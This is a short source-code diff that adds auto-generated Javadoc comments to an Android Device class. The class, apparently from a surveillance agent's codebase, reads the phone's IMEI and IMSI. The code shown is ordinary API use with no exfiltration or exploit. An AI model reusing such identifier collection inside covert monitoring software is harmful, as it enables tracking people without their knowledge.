@@ -13,6 +13,7 @@ import android.telephony.TelephonyManager;
 import com.ht.RCSAndroidGUI.utils.Check;
 import com.ht.RCSAndroidGUI.utils.Utils;
 
+// TODO: Auto-generated Javadoc
 /**
  * The Class Device.
  */
@@ -84,17 +85,32 @@ public class Device {
 		return versionRet;
 	}
 
+	/**
+	 * Checks if is cDMA.
+	 *
+	 * @return true, if is cDMA
+	 */
 	public static boolean isCDMA() {
 		// TODO Auto-generated method stub
 		return false;
 	}
 
+	/**
+	 * Gets the imei.
+	 *
+	 * @return the imei
+	 */
 	public String getImei() {
 		final TelephonyManager telephonyManager = (TelephonyManager) Status
 				.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
 		return telephonyManager.getDeviceId();
 	}
 
+	/**
+	 * Gets the imsi.
+	 *
+	 * @return the imsi
+	 */
 	public String getImsi() {
 		final TelephonyManager telephonyManager = (TelephonyManager) Status
 				.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
